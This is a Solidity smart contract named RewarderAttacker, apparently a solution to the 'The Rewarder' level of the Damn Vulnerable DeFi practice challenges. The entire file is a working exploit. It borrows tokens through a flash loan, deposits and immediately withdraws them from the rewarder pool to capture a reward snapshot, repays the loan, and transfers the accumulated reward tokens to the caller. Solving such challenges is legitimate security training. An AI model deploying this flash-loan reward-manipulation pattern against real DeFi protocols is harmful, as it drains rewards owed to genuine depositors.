// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../the-rewarder/FlashLoanerPool.sol';
import '../the-rewarder/TheRewarderPool.sol';
import '../the-rewarder/RewardToken.sol';
import '../DamnValuableToken.sol';

contract RewarderAttacker {
	FlashLoanerPool immutable flashPool;
	TheRewarderPool immutable rewarderPool;
	DamnValuableToken immutable DVT;
	RewardToken immutable rewardToken;

	constructor(
		address _flashPool,
		address _rewarderPool,
		address _dvt,
		address _rewardToken
	) {
		flashPool = FlashLoanerPool(_flashPool);
		rewarderPool = TheRewarderPool(_rewarderPool);
		DVT = DamnValuableToken(_dvt);
		rewardToken = RewardToken(_rewardToken);
	}

	function executeFlashLoan(uint256 amount) external {
		flashPool.flashLoan(amount);
	}

	function receiveFlashLoan(uint256 amount) external {
		DVT.approve(address(rewarderPool), amount);
		rewarderPool.deposit(amount);
		rewarderPool.withdraw(amount);
		DVT.transfer(address(flashPool), amount);
	}

	function withdrawRewards() external {
		rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
	}
}